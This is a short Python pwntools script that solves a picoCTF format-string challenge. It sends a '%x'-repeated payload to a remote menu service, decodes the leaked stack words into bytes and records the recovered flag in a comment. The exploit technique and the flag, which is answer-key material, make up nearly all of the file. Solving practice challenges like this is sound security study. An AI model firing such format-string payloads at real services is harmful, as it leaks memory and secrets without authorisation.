from pwn import *

HOST = 'mercury.picoctf.net'
PORT = 53437

def main():
	r = remote(HOST, PORT)
	p = r.recvuntil('portfolio\n')
	r.sendline('1')
	p = r.recvuntil('token?\n')
	payload = '%x'*100
	r.sendline(payload)
	p = r.recvline()
	p = r.recvline()[:-1]
	p = str(p)[2:-1][4:] # small offset
	print(p)
	a = []
	ret = ''
	for i in range(0,len(p),8):
		temp = ''
		for j in range(i+8, i, -2):
			temp += p[j-2:j]
		
		print(p[i:i+8], temp)
		ret += temp
	print(bytes.fromhex(ret))

	# Flag: picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}


if __name__ == '__main__':
	main()


